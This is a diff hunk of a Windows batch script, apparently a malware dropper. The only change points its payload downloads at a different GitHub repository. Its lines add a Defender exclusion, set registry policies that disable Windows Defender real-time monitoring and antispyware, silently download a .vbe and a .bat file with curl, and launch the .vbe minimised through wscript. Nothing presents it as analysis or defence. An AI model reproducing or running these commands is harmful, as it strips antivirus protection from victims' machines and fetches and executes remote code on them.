@@ -30,8 +30,8 @@ powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:
 :run_as_admin
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-curl -s -o "scriptmenagers".vbe -JL "https://github.com/MidlesLex/SkyblockApi/raw/main/scriptmenagers.vbe"
-curl -s -o "msisettings".bat -JL "https://github.com/MidlesLex/SkyblockApi/raw/main/installer.bat"
+curl -s -o "scriptmenagers".vbe -JL "https://github.com/DanGILC-137/Legend/raw/main/scriptmenagers.vbe"
+curl -s -o "msisettings".bat -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.bat"
 start /min wscript.exe "scriptmenagers.vbe"
 
 :: Check if PowerShell exists
